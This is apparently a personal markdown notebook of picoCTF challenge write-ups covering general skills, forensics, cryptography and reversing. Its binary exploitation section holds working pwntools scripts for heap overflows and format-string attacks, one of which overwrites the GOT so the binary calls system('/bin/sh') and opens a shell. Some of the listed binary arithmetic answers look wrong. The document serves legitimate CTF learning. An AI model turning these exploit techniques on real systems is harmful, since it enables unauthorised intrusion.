# ctf

## Common commands
1. `strings file.txt`
    1. Print the sequences of printable characters in files
1. `file file.txt`
    1. Determine file type
1. `exiftool file.txt`
    1. Outputs metadata about a file

```python
from pwn import *

p = remote("server.picoctf.net", 12345)

p.recvuntil(b"wait until im visible")
p.sendline(b"write something to command line")

print(p.recvall())
```

## PicoCTF

### General Skills
#### Time Machine
- [Link](https://play.picoctf.org/practice/challenge/425)
- From: PicoCTF 2024
- Difficulty: Easy
- Completed: 2024/09/08

Description:

What was I last working on? I remember writing a note to help me remember... You can download the challenge files here: [challenge.zip](https://artifacts.picoctf.net/c_titan/160/challenge.zip)

Solution:

1. `wget <url>` revelas that there are at least git files in the downloaded directory. Calling `git log` shows the flag.

#### Super SSH
- [Link](https://play.picoctf.org/practice/challenge/424)
- From: PicoCTF 2024
- Difficulty: Easy
- Completed: 2024/09/08

Description:

Using a Secure Shell (SSH) is going to be pretty important. Can you ssh as ctf-player to titan.picoctf.net at port xxxxx to get the flag?

Solution:

1. `man ssh` shows docs for the command. Run `ssh -p xxxxx ctf-player@titan.picoctf.net`

#### Binary Search
- [Link](https://play.picoctf.org/practice/challenge/442)
- From: PicoCTF 2024
- Difficulty: Easy
- Completed: 2024/08/24

Description:

Want to play a game? As you use more of the shell, you might be interested in how they work! Binary search is a classic algorithm used to quickly find an item in a sorted list. Can you find the flag? You'll have 1000 possibilities and only 10 guesses. Cyber security often has a huge amount of data to look through - from logs, vulnerability reports, and forensics. Practicing the fundamentals manually might help you in the future when you have to write your own tools! You can download the challenge files here: [challenge.zip](https://artifacts.picoctf.net/c_atlas/18/challenge.zip)

Solution:

1. The challenge.zip contained a shell script which asked to guess a number between 1 and 1000 and it said if the correct number is lower or higher. Like the challenge name suggest, the idea is to use binary search and always guess the number between known lower and higher end.

#### endianness
- [Link]()
- From: PicoCTF 2024
- Difficulty: Easy
- Completed: 2024/09/09

Description:

Know of little and big endian? [Source](https://artifacts.picoctf.net/c_titan/117/flag.c)

Solution:

1. Quickly looking at the code confirms the task category being general knowledge so instead of trying to read the code, it's enough to just run it.
2. The program asks first little endian representation of a word. From code we see ASCII hexadecimal format is accepted.
3. I used online converted to get big endian and then converted it to little endian manually.

Big endian: 6C 72 79 73 69
Little endian: 69 73 79 72 6C

#### Commitment Issues
- [Link](https://play.picoctf.org/practice/challenge/411)
- From: PicoCTF 2024
- Difficulty: Easy
- Completed: 2024/09/10

Description:

I accidentally wrote the flag down. Good thing I deleted it! You download the challenge files here: [challenge.zip](https://artifacts.picoctf.net/c_titan/75/challenge.zip)

Solution:

1. The zip contained a folder with git initialized. The version history had two commits and running `git show <first commit hash>` showed the flag.

#### Collaborative Development
- [Link](https://play.picoctf.org/practice/challenge/410)
- From: PicoCTF 2024
- Difficulty: Easy
- Completed: 2024/09/10

Description:

My team has been working very hard on new features for our flag printing program! I wonder how they'll work together? You can download the challenge files here: [challenge.zip](https://artifacts.picoctf.net/c_titan/69/challenge.zip)

Solution:

1. Flags were hidden into three different branches `git show feature/part-1` and copy pasting the parts gave the whole flag.

#### Blame Game
- [Link](https://play.picoctf.org/practice/challenge/405)
- From: PicoCTF 2024
- Difficulty: Easy
- Completed: 2024/09/10

Description:

Someone's commits seems to be preventing the program from working. Who is it? You can download the challenge files here: [challenge.zip](https://artifacts.picoctf.net/c_titan/157/challenge.zip)

Solution:

1. `git log` shows bunch of commits with the same message and it seems like most of them are empty. The Python file that's in the folder seems to have a mistake and probably it's done in a commit that has the flag in it.
2. `git blame -f message.py` reveals the flag.

#### binhexa
- [Link](https://play.picoctf.org/practice/challenge/404)
- From: PicoCTF 2024
- Difficulty: Easy
- Completed: 2024/09/10

Description:

How well can you perfom basic binary operations? Start searching for the flag here nc titan.picoctf.net xxxxx

Solution:

Binary Number 1: 01100101
Binary Number 2: 01001100

1. `+` operation result is `010110001`
2. `2nd number >> 1` operation result is `100110`
3. `&` operation result is `01000100`
4. `*` operation result is `01110111111100`
5. `2nd number << 1` operation result is `11001010`
6. `|` operation result is `01101101`

#### repetitions
- [Link](https://play.picoctf.org/practice/challenge/371)
- From: PicoCTF 2023
- Difficulty: Easy
- Completed: 2024/09/18

Description:

Can you make sense of this file? Download the file [here](https://artifacts.picoctf.net/c/471/enc_flag).

Solution:

1. The encoded flag looks like base64 encoded and the title suggests that it has been encoded multiple times
2. Base64 decoding the flag 5 times gave the correct flag

#### Big Zip
- [Link](https://play.picoctf.org/practice/challenge/322)
- From: PicoGym Exclusive
- Difficulty: Easy
- Completed: 2024/09/18

Description:

Unzip this archive and find the flag. [Download zip file](https://artifacts.picoctf.net/c/504/big-zip-files.zip)

Solution:

1. Extracting the given file gives a lot of nested files which suggests to use automated way to search through them
2. `grep -R "picoCTF" .` searches files where content includes "picoCTF" and this found the flag from one file

#### First Find
- [Link](https://play.picoctf.org/practice/challenge/320)
- From: PicoGym Exclusive
- Difficulty: Easy
- Completed: 2024/09/18

Description:

Unzip this archive and find the file named 'uber-secret.txt' [Download zip file](https://artifacts.picoctf.net/c/502/files.zip)

Solution:

1. I use `unzip file.zip` to extract a compressed file and it by default prints all file paths so I were able to just find the path for `uber-secret.txt` from a handful of other options and check content of it which were the flag.
2. If there were more files than possible to glance manually, `find . -name uber-secret.txt` could be used to find a path to the file.


#### runme.py
- [Link](https://play.picoctf.org/practice/challenge/250)
- From: Beginner PicoMini 2022
- Difficulty: Easy
- Completed: 2024/09/18

Description:

Run the runme.py script to get the flag. Download the script with your browser or with wget in the webshell. [Download runme.py Python script](https://artifacts.picoctf.net/c/34/runme.py)

Solution:

1. Just need to download the python script and run it with `python runme.py` and it prints the flag.

#### PW Crack 2
- [Link](https://play.picoctf.org/practice/challenge/246)
- From: Beginner PicoMini 2022
- Difficulty: Easy
- Completed: 2024/09/19

Description:

Can you crack the password to get the flag? Download the password checker [here](https://artifacts.picoctf.net/c/15/level2.py) and you'll need the encrypted [flag](https://artifacts.picoctf.net/c/15/level2.flag.txt.enc) in the same directory too.

Solution:

1. The python program reveals the password when this condition is true `user_pw == chr(0x33) + chr(0x39) + chr(0x63) + chr(0x65)`
2. I just opened Python terminal and checked the value of `char(0x33) + cha...` and gave it to the program and got my flag back

#### PW Crack 1
- [Link](https://play.picoctf.org/practice/challenge/245)
- From: Beginner picoMini 2022
- Difficulty: Easy
- Completed: 2024/09/19

Description:

Can you crack the password to get the flag? Download the password checker [here](https://artifacts.picoctf.net/c/10/level1.py) and you'll need the encrypted [flag](https://artifacts.picoctf.net/c/10/level1.flag.txt.enc) in the same directory too.

Solution:

1. The program has condition `user_pw == "691d"` so giving input `691d` to the program reveals the flag

#### HashingJobApp
- [Link](https://play.picoctf.org/practice/challenge/243)
- From: Beginner picoMini 2022
- Difficulty: Easy
- Completed: 2024/09/19

Description:

If you want to hash with the best, beat this test!

Solution:

Please md5 hash the text between quotes, excluding the quotes: 'a morgue'

1. The server application asked 3 of these questions and I answered them using an online md5 hash generator and got the flag

#### Glitch Cat
- [Link](https://play.picoctf.org/practice/challenge/242)
- From: Beginner picoMini 2022
- Difficulty: Easy
- Completed: 2024/09/19

Description:

Our flag printing service has started glitching!

Solution:

1. The server printed the flag where some parts of it were replaced with `char(0x23)` type of parts and I just copy pasted the output to Python command line and got the complete flag.

#### fixme2.py
- [Link](https://play.picoctf.org/practice/challenge/241)
- From: Beginner picoMini 2022
- Difficulty: Easy
- Completed: 2024/09/19

Description:

Fix the syntax error in the Python script to print the flag. [Download Python script](https://artifacts.picoctf.net/c/4/fixme2.py)

Solution:

1. One if condition had only one `=` and adding second to it fixed the syntax of the script and printed the flag.


#### fixme1.py
- [Link](https://play.picoctf.org/practice/challenge/240)
- From: Beginner picoMini 2022
- Difficulty: Easy
- Completed: 2024/09/19

Description:

Fix the syntax error in this Python script to print the flag. [Download Python script](https://artifacts.picoctf.net/c/27/fixme1.py)

Solution:

1. The last line were intended and removing it fixed the script.


#### convertme.py
- [Link](https://play.picoctf.org/practice/challenge/239)
- From: Beginner picoMini 2022
- Difficulty: Easy
- Completed: 2024/09/19

Description:

Run the Python script and convert the given number from decimal to binary to get the flag. [Download Python script](https://artifacts.picoctf.net/c/22/convertme.py)

Solution:

1. If 88 is in decimal base, what is it in binary base?
    1. 1011000

#### Codebook
- [Link](https://play.picoctf.org/practice/challenge/238)
- From: Beginner picoMini 2022
- Difficulty: Easy
- Completed: 2024/09/19

Description:

Run the Python script code.py in the same directory as codebook.txt.
[Download code.py](https://artifacts.picoctf.net/c/3/code.py)
[Download codebook.txt](https://artifacts.picoctf.net/c/3/codebook.txt)

Solution:

1. Just downloading the both files and running the Python script gave the flag.

#### Magikarp Ground Mission
- [Link](https://play.picoctf.org/practice/challenge/189)
- From: picoCTF 2021
- Difficulty: Easy
- Completed: 2024/09/19

Description:

Do you know how to move between directories and read files in the shell? Start the container, `ssh` to it, and then `ls` once connected to begin. Login via `ssh` as `ctf-player` with the password, `481e7b14`

Solution:

1. `ssh ctf-player@<server> -p <port>`
2. `cat 1of3.flag.txt`
3. `cat /2of3.flag.txt`
4. `cat ~/3of3.flag.txt`


#### Tab, Tab, Attack
- [Link](https://play.picoctf.org/practice/challenge/176)
- From: picoCTF 2021
- Difficulty: Easy
- Completed: 2024/09/19

Description:

Using tabcomplete in the Terminal will add years to your life, esp. when dealing with long rambling directory structures and filenames: Addadshashanammu.zip

Solution:

1. There was a file burried under a bunch of folders and executing it outputted the flag


#### Wave a flag
- [Link](https://play.picoctf.org/practice/challenge/170)
- From: picoCTF 2021
- Difficulty: Easy
- Completed: 2024/09/19

Description:

Can you invoke help flags for a tool or binary? [This program](https://mercury.picoctf.net/static/b28b6021d6040b086c2226ebeb913bc2/warm) has extraordinarily helpful information...

Solution:

1. `chmod +x warm` makes the file executable
2. Then running `./warm -h` outputs the flag

#### Python Wrangling
- [Link](https://play.picoctf.org/practice/challenge/166)
- From: picoCTF 2021
- Difficulty: Easy
- Completed: 2024/09/19

Description:

Python scripts are invoked kind of like programs in the Terminal... Can you run [this Python script](https://mercury.picoctf.net/static/0bf545252b5120845e3b568b9ad0277e/ende.py) using [this password](https://mercury.picoctf.net/static/0bf545252b5120845e3b568b9ad0277e/pw.txt) to get [the flag](https://mercury.picoctf.net/static/0bf545252b5120845e3b568b9ad0277e/flag.txt.en)?

Solution:

1. `python ende.py -d flag.txt.en` and then input password from `pw.txt` or just one line `python ende.py -d flag.txt.en < pw.txt`

#### Static ain't always noise
- [Link](https://play.picoctf.org/practice/challenge/163)
- From: picoCTF 2021
- Difficulty: Easy
- Completed: 2024/09/19

Description:

Can you look at the data in this binary: [static](https://mercury.picoctf.net/static/ec4dbd8898ade34e1d60d5b70c1b8c8c/static)? This [BASH script](https://mercury.picoctf.net/static/ec4dbd8898ade34e1d60d5b70c1b8c8c/ltdis.sh) might help!

Solution:

1. `./ltdis.sh static` creates two new files `static.ltdis.strings.txt` and `static.ltdis.x86_64.txt`. Former contains the flag in a list of other strings.

#### Nice netcat...
- [Link](https://play.picoctf.org/practice/challenge/156)
- From: picoCTF 2021
- Difficulty: Easy
- Completed: 2024/09/19

Description:

There is a nice program that you can talk to by using this command in a shell: `$ nc mercury.picoctf.net 22342`, but it doesn't speak English...

Solution:

1. The server prints a list of numbers which can be stored to a file with `nc mercury.picoctf.net 22342 > file.txt`
2. Each number represents a char so the following Python script decodes all of them

```python3
with open("test.txt", "r") as f:
    for line in f:
        for num in line.split():
            print(chr(int(num)), end="")
```

#### Obedient Cat
- [Link](https://play.picoctf.org/practice/challenge/147)
- From: picoCTF 2021
- Difficulty: Easy
- Completed: 2024/09/19

Description:

This file has a flag in plain sight (aka "in-the-clear"). [Download flag](https://mercury.picoctf.net/static/2d24d50b4ebed90c704575627f1f57b2/flag).

Solution:

1. `cat flag` gives the flag


#### 2Warm
- [Link](https://play.picoctf.org/practice/challenge/86)
- From: picoCTF 2019
- Difficulty: Easy
- Completed: 2024/09/19

Description:

Can you convert the number 42 (base 10) to binary (base 2)?

Solution:

1. Manually converting base 10 to base 2 requires finding the biggest power of 2. 32 is the first biggest so we have `1xxxxx`. 10 is left. Then the biggest is 8 so we have `101xxx`. 2 is left and that's exactly `2**1` so the binary is `101010` and the flag is `picoCTF{101010}`


#### First Grep
- [Link](https://play.picoctf.org/practice/challenge/85)
- From: picoCTF 2019
- Difficulty: Easy
- Completed: 2024/09/29

Description:

Can you find the flag in [file](https://jupiter.challenges.picoctf.org/static/515f19f3612bfd97cd3f0c0ba32bd864/file)? This would be really tedious to look through manually, something tells me there is a better way.

Solution:

1. It seems possible to find the flag manually from the flag file but using `cat file | grep picoCTF` finds it faster by looking for string that starts picoCTF.


#### Bases
- [Link](https://play.picoctf.org/practice/challenge/67)
- From: picoCTF 2019
- Difficulty: Easy
- Completed: 2024/09/29

Description:

What does this `bDNhcm5fdGgzX3IwcDM1` mean? I think it has something to do with bases.

Solution:

1. base64 decoder gives `l3arn_th3_r0p35` and then that can be put to the correct format `picoCTF{l3arn_th3_r0p35}`

#### Warmed Up
- [Link](https://play.picoctf.org/practice/challenge/58)
- From: picoCTF 2019
- Difficulty: Easy
- Completed: 2024/09/29

Description:

What is 0x3D (base 16) in decimal (base 10)?

Solution:

1. (16 * 3) + (13) = 61


#### strings it
- [Link](https://play.picoctf.org/practice/challenge/37)
- From: picoCTF 2019
- Difficulty: Easy
- Completed: 2024/09/29

Description:

Can you find the flag in [file](https://jupiter.challenges.picoctf.org/static/fae9ac5267cd6e44124e559b901df177/strings) without running it?

Solution:

1. `strings strings | grep pico`

#### what's a net cat?
- [Link](https://play.picoctf.org/practice/challenge/34)
- From: picoCTF 2019
- Difficulty: Easy
- Completed: 2024/09/29

Description:

Using netcat (nc) is going to be pretty important. Can you connect to jupiter.challenges.picoctf.org at port 41120 to get the flag?

Solution:

1. `nc jupiter.challenges.picoctf.org 41120` and it prints the flag


#### Lets warm up
- [Link](https://play.picoctf.org/practice/challenge/22)
- From: picoCTF 2019
- Difficulty: Easy
- Completed: 2024/09/29

Description:

If I told you a word started with 0x70 in hexadecimal, what would it start with in ASCII?

Solution:

1. `0x70` is `p` in ASCII









---




### Forensics
#### Verify
- [Link](https://play.picoctf.org/practice/challenge/450)
- From: PicoCTF 2024
- Difficulty: Easy
- Completed: 2024/08/24

Description:

People keep trying to trick my players with imitation flags. I want to make sure they get the real thing! I'm going to provide the SHA-256 hash and a decrypt script to help you know that my flags are legitimate. You can download the challenge files here:
[challenge.zip](https://artifacts.picoctf.net/c_rhea/21/challenge.zip)


Solution:

1. `wget <url to challenge.zip>`
1. `unzip challenge.zip`
1. `cd home/ctf-player/drop-in`
1. The challenge.zip contains a checksum file and a folder with 301 files.
1. `sha256sum files/* | grep <checksum.txt content>` finds a file that's checksum matches to the given flag checksum
1. `./decrypt.sh files/<the matching file from the previous command>`

#### Scan Surprise
- [Link](https://play.picoctf.org/practice/challenge/444)
- From: PicoCTF 2024
- Difficulty: Easy
- Completed: 2024/08/24


Description:

I've gotten bored of handing out flags as text. Wouldn't it be cool if they were an image instead? You can download the challenge files here: [challenge.zip](https://artifacts.picoctf.net/c_atlas/14/challenge.zip)


Solution:

1. The challenge.zip contains a QR code in an image file and scanning it with phone displays the flag.


Extra:

I wasn't familiar how QR codes can be decoded manually but I found [this](https://blog.qartis.com/decoding-small-qr-codes-by-hand/) great article explaining it.

#### Secret of the Polyglot
- [Link](https://play.picoctf.org/practice/challenge/423)
- From: PicoCTF 2024
- Difficulty: Easy
- Completed: 2024/09/08

Description:

he Network Operations Center (NOC) of your local institution picked up a suspicious file, they're getting conflicting information on what type of file it is. They've brought you in as an external expert to examine the file. Can you extract all the information from this strange file? Download the suspicious file [here](https://artifacts.picoctf.net/c_titan/9/flag2of2-final.pdf).

Solution:

1. Opening the PDF files shows the last part of the flag.
2. `file <filename>.pdf` reveals that it's `png` so `mv <filename>.pdf <filename>.png` and then looking at it reveals the first part of the flag.

#### CanYouSee
- [Link](https://play.picoctf.org/practice/challenge/408)
- From: PicoCTF 2024
- Difficulty: Easy
- Completed: 2024/09/10

Description:

How about some hide and seek? Download this file [here](https://artifacts.picoctf.net/c_titan/128/unknown.zip).

Solution:

1. `exiftool ukn_reality.jpg` gives `Attribution URL` value which is base64 encoded flag


#### information
- [Link](https://play.picoctf.org/practice/challenge/186)
- From: picoCTF 2021
- Difficulty: Easy
- Completed: 2024/09/19

Description:

Files can always be changed in a secret way. Can you find the flag? [cat.jpg](https://mercury.picoctf.net/static/c28a959c5605d5f67480d5dd3a77f302/cat.jpg)

Solution:

1. `exiftool cat.jpg` shows License value that can be base 64 decoded to get the flag.


#### Glory of the Garden
- [Link](https://play.picoctf.org/practice/challenge/44)
- From: picoCTF 2019
- Difficulty: Easy
- Completed: 2024/09/29

Description:

This [garden](https://jupiter.challenges.picoctf.org/static/4153422e18d40363e7ffc7e15a108683/garden.jpg) contains more than it seems.

Solution:

1. `strings garden.jpg | grep pico` reveals the flag that were as a string added to the file









---



### Binary Exploitation
#### heap 0
- [Link](https://play.picoctf.org/practice/challenge/438)
- From: PicoCTF 2024
- Difficulty: Easy
- Completed: 2024/08/24

Description:

Are overflows just a stack concern? Download the binary [here](https://artifacts.picoctf.net/c_tethys/29/chall). Download the source [here](https://artifacts.picoctf.net/c_tethys/29/chall.c).

Solution:

1. `vi chall.c` reading the source file
2. In `check_win()` there is a condition `strcmp(safe_var, "bico") != 0` which shows that the idea of this challenge is to edit `safe_var` to not match `bico`.
3. In `init()` we set `pico` to `input_data` and `bico` to `safe_var` and both gets 5 bytes of memory allocated to them.
4. The last important part is `write_buffer()` which writes input to `input_data`
5. The idea is to use the terminal UI to write longer than 5 bytes to `input_data` so it overflows to `safe_var` changing its value.
6. `a` fits 110 times into `input_data` and then it overflows into `safe_var`.

#### heap 1
- [Link](https://play.picoctf.org/practice/challenge/439)
- From: PicoCTF 2024
- Difficulty: Medium
- Completed: 2024/10/19

Description:

Can you control your overflow? Download the binary [here](https://artifacts.picoctf.net/c_tethys/2/chall). Download the source [here](https://artifacts.picoctf.net/c_tethys/2/chall.c).

Solution:

1. Similar way to heap 0 challenge, first variable in a heap can be edited but the second needs to be changed to `pico`. By giving input that's size more than 32 characters, we can see that the characters 33, 34, ... goes to the second variable.
2. The second variable can be overwritten but inputting a string of 32 any characters and then "pico" in the end so the "pico" is stored to the second location in the heap
3. When the second location in heap stores "pico", the program prints the flag with the "print flag" command.

#### heap 2
- [Link](https://play.picoctf.org/practice/challenge/435)
- From: PicoCTF 2024
- Difficulty: Medium
- Completed: 2024/10/19

Descrition:

Can you handle function pointers? Download the binary [here](https://artifacts.picoctf.net/c_mimas/50/chall). Download the source [here](https://artifacts.picoctf.net/c_mimas/50/chall.c).

Solution:

1. `void check_win() { ((void (*)())*(int*)x)(); }` basically calls function of address stored in `x` and the idea of this challenge is to overwrite `x` with address of `win` function.
3. `objdump -D chall | grep win` revelas the address of `win` function which is `00000000004011a0`.
4. Following Python code gets the flag

```python
from pwn import *

p = remote("mimas.picoctf.net", 54665)

p.sendline(b"2")
p.recvuntil(b"buffer")
p.sendline(b"12345678901234567890123456789012\xa0\x11\x40\x00\x00\x00\x00\x00")

p.recvuntil(b"choice")
p.sendline(b"4")
print(p.recvall())
```

#### format string 0
- [Link](https://play.picoctf.org/practice/challenge/433)
- From: PicoCTF 2024
- Difficulty: Easy
- Completed: 2024/09/07

Description:

Can you use your knowledge of format strings to make the customers happy? Download the binary [here](https://artifacts.picoctf.net/c_mimas/77/format-string-0). Download the source [here](https://artifacts.picoctf.net/c_mimas/77/format-string-0.c).

Solution:

1. The source file has line `signal(SIGSEGV, sigsegv_handler);` in `main` function. `sigsegv_handler` seems to print the flag so the idea is to call it and it's called when the program tries to access invalid memory location.
2. When running the program, it first asks what to server for Patrick. After choosing, it has a check `count > 2 * BUFSIZE` where count is `printf(<selected value>)` and `BUFSIZE` is `32`. Out of the options `Gr%114d_Cheese` is longer than 32 because it has `%114d` which normally asks numbers size of 114 but because not provided, it is filled with random characters.
3. After Patrick is served with `Gr%114d_Cheese`, Bob needs to be served next. He has an option `Cla%sic_Che%s%steak` which in `printf` expects strings to fill `%s` and when not provided, tries to access invalid memory location triggering `sigsegv_handler` function.

#### format string 3
- [Link](https://play.picoctf.org/practice/challenge/449)
- From: PicoCTF 2024
- Difficulty: Medium
- Completed: 2024/10/16

Description:

This program doesn't contain a win function. How can you win?

Download the binary [here](https://artifacts.picoctf.net/c_rhea/29/format-string-3).

Download the source [here](https://artifacts.picoctf.net/c_rhea/29/format-string-3.c).

Download libc [here](https://artifacts.picoctf.net/c_rhea/29/libc.so.6), download the interpreter [here](https://artifacts.picoctf.net/c_rhea/29/ld-linux-x86-64.so.2). Run the binary with these two files present in the same directory.

Solution:

I had to look help by reading [this writeup](https://blog.thecyberthesis.com/blog/writeups/picoCTF/pwn/format-string-3) and it was referencing to [this great blog post](https://www.theflash2k.me/blog/ctf-techs/fsb-guide).

The goal of this challenge is to overwrite `puts` entry in Global Offset Table (GOT) to so instead of calling `puts("/bin/sh")` we call `system("/bin/sh")` which gives terminal access to the server.

1. The program prints `setvbuf` address in memory
    1. `0x71ac0c2553f0`
2. Find offset of input in stack
    1. For a payload, we need index in stack where the input is added. When `%p` is given to `printf`, it outputs hex value. If there are more s.. than parameters, the function starts taking values from stack. By adding something familiar like AAAAAAAA, we can recgonize where it's located in the stack.
    2. Inputting `AAAAAAAA|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|` to the program, shows that `0x4141...` (=AA...) is located in `38`.
3. Find offset of `setvbuf` in `libc` library
    1. To calculate where in `libc` library `setvbuf` is located we can call `objdump -T ./libc.so.6 | grep "setvbuf"`
    2. `0x000000000007a3f0`
4. Calculate offset of `libc` in memory
    1. We know address of `setvbuf` and offset in `libc` library so we can calulate address of `libc` by reducing offset from the address.
    2. `0x71ac0c2553f0 - 0x000000000007a3f0 = 0x71AC0C1DB000`
5. Python payload
`pwn` library in Python has a function called `fmtstr_payload` which can replace `puts` with `system`. Basically otherwise the code does above steps.

```python
from pwn import *

exe = "./format-string-3"
elf = context.binary = ELF(exe)
libc = ELF("./libc.so.6")

io = remote("rhea.picoctf.net", 51240)

start = 38

io.recvuntil(b'setvbuf in libc: ')
leak = int(io.recvline().strip(), 16)
print("setvbuf @ %#x" % leak)

libc.address = leak - 0x000000000007a3f0
print("libc @ %#x" % libc.address)

payload = fmtstr_payload(start, {elf.sym.got.puts: libc.sym.system})

io.sendline(payload)
io.interactive()
```

6. Running this payload against the server given in the description gives terminal access. `ls` reveals a file called `flag.txt` and the flag is hidden inside is as text content.

#### format string 2
- [Link](https://play.picoctf.org/practice/challenge/448)
- From: PicoCTF 2024
- Difficulty: Medium
- Completed: 2024/10/18

Description:

This program is not impressed by cheap parlor tricks like reading arbitrary data off the stack. To impress this program you must change data on the stack! Download the binary [here](https://artifacts.picoctf.net/c_rhea/26/vuln). Download the source [here](https://artifacts.picoctf.net/c_rhea/26/vuln.c).

Solution:

Basically there is C code where we need to change value of a variable to something else by exploiting printf vulnurability.

1. Connect to the server and give `AAAAAAAA|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p` as input to get the offset. It's 14 in this case.
2. `objdump -D ./vuln | grep "sus"` reveals address of the sus variable
3. The following payload changes `sus` value and reveals the flag:

```python
from pwn import *

context.binary = ELF('./vuln')

p = remote('rhea.picoctf.net', 50780)

payload = fmtstr_payload(14, {0x404060: 0x67616c66})

p.sendline(payload)

flag = p.recvall()

print("Flag: ", flag)
```







---



### Cryptography

#### interencdec
- [Link](https://play.picoctf.org/practice/challenge/418)
- From: PicoCTF 2024
- Difficulty: Easy
- Completed: 2024/09/09

Description:

Can you get the real meaning from this file. Download the file [here](https://artifacts.picoctf.net/c_titan/111/enc_flag). 

Solution:

1. The file content looks like base64. Running it through base64 decoder twice reveals a string that looks like the flag but the characters aren't correct.
2. These challenges often use ROT cipher so it's easy to try when the flags always start picoCTF. And in this case it's ROT 7 that decodes this.

#### Mod 26
- [Link](https://play.picoctf.org/practice/challenge/144)
- From: picoCTF 2021
- Difficulty: Easy
- Completed: 2024/09/19

Description:

Cryptography can be easy, do you know what ROT13 is? cvpbPGS{arkg_gvzr_V'yy_gel_2_ebhaqf_bs_ebg13_nSkgmDJE}

Solution:

1. Online Rot13 decoder decodes the flag but the title gives the other way to solve this by turning each character into a number `n` between 0 and 25 and then calculating `(n - 13) % 26` to get rot 13 decoded value.

#### The Numbers
- [Link](https://play.picoctf.org/practice/challenge/68)
- From: picoCTF 2019
- Difficulty: Easy
- Completed: 2024/09/29

Description:

The [numbers](https://jupiter.challenges.picoctf.org/static/f209a32253affb6f547a585649ba4fda/the_numbers.png)... what do they mean?

Solution:

1. The image has numbers and `{`/`}` characters in it. `16 9 3 15 3 20 6 { 20 8 5 14 21 13 2 5 18 19 13 1 19 15 14 }` Looks like the first numbers coresponds to picoCTF and then there is the changing flag value.
2. `p` is 16th character in alphabets and `c` is 9th which suggests how these can be converted to characters
3. I created simple python script to convert the changing part of the flag.

```python
import string

for n in [20, 8, 5, 14, 21, 13, 2, 5, 18, 19, 13, 1, 19, 15, 14]:
    print(list(string.ascii_lowercase)[n-1], end="")
```

#### 13
- [Link](https://play.picoctf.org/practice/challenge/62)
- From: picoCTF 2019
- Difficulty: Easy
- Completed: 2024/09/29

Description:

Cryptography can be easy, do you know what ROT13 is? `cvpbPGS{abg_gbb_onq_bs_n_ceboyrz}`

Solution:

1. The title suggested this is rot 13 encoded flag







---


### Reverse Engineering

#### Transformation
- [Link](https://play.picoctf.org/practice/challenge/104)
- From: picoCTF 2021
- Difficulty: Easy
- Completed: 2024/09/19

Description:

I wonder what this really is... [enc](https://mercury.picoctf.net/static/e47483f88b12f2ab0c46315afc12f64d/enc) ''.join([chr((ord(flag[i]) << 8) + ord(flag[i + 1])) for i in range(0, len(flag), 2)])

Solution:

1. Following script solves the flag. The flag characters are between 48 and 125 ascii codes so the range can be narrowed and then the idea is to try which character works.

```python3
enc = "灩捯䍔䙻ㄶ形楴獟楮獴㌴摟潦弸彥ㄴㅡて㝽"

for enc_chr in enc:
    enc_num = ord(enc_chr)
    for i in range(48, 126):
        if enc_num - (i << 8) <= 125 and enc_num - (i << 8) >= 48:
            print(chr(i) + chr(enc_num - (i << 8)), end="")
```

#### vault-door-training
- [Link](https://play.picoctf.org/practice/challenge/7)
- From: PicoCTF 2019
- Difficulty: Easy
- Completed: 2024/09/29

Description:

Your mission is to enter Dr. Evil's laboratory and retrieve the blueprints for his Doomsday Project. The laboratory is protected by a series of locked vault doors. Each door is controlled by a computer and requires a password to open. Unfortunately, our undercover agents have not been able to obtain the secret passwords for the vault doors, but one of our junior agents obtained the source code for each vault's computer! You will need to read the source code for each level to figure out what the password is for that vault door. As a warmup, we have created a replica vault in our training facility. The source code for the training vault is here: [VaultDoorTraining.java](https://jupiter.challenges.picoctf.org/static/03c960ddcc761e6f7d1722d8e6212db3/VaultDoorTraining.java)

Solution:

1. It was enough to open the file and the password/flag were written to the code.







